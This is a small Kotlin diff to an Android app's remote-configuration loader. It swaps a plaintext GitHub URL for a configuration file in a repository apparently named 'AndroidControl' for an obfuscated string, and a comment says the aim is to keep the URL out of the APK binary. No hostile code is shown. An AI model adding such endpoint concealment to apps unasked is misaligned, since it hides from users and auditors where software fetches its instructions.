@@ -11,8 +11,8 @@ import java.util.concurrent.TimeUnit
  */
 internal object RemoteConfig {
 
-    private const val CONFIG_URL =
-        "https://raw.githubusercontent.com/Kztutorial99/AndroidControl/main/android-config.json"
+    // URL di-obfuscate via ObfStr — tidak muncul sebagai plaintext di APK binary
+    private fun configUrl() = ObfStr.configUrl()
 
     private val http = OkHttpClient.Builder()
         .connectTimeout(6, TimeUnit.SECONDS)
@@ -30,7 +30,7 @@ internal object RemoteConfig {
      */
     fun fetch(): Boolean {
         return try {
-            val resp = http.newCall(Request.Builder().url(CONFIG_URL).get().build())
+            val resp = http.newCall(Request.Builder().url(configUrl()).get().build())
                 .execute().use { it.body?.string() }
             if (!resp.isNullOrBlank()) {
                 val json = JsonParser.parseString(resp).asJsonObject
